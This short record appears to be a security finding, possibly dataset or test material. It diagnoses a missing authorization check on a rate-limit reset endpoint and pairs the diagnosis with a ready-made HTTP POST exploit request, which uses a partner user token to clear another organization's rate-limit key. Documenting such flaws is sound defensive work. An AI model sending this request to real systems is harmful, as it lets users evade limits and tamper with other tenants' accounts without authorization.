diagnosis: The rate limit reset route accepts an arbitrary rateLimitKey in the request payload and calls rateLimiter.delete() without checking if the user owns that API key or has administrative privileges over that partner organization, allowing users to evade their own rate limits or clear limits for unauthorized entities.
exploit_request:
POST /api/admin/rate-limits/reset-key HTTP/1.1
Host: console.partner-apis.io:9003
Authorization: Bearer <partner_user_token>
Content-Type: application/json

{"rateLimitKey": "partner_tier_org_9921"}
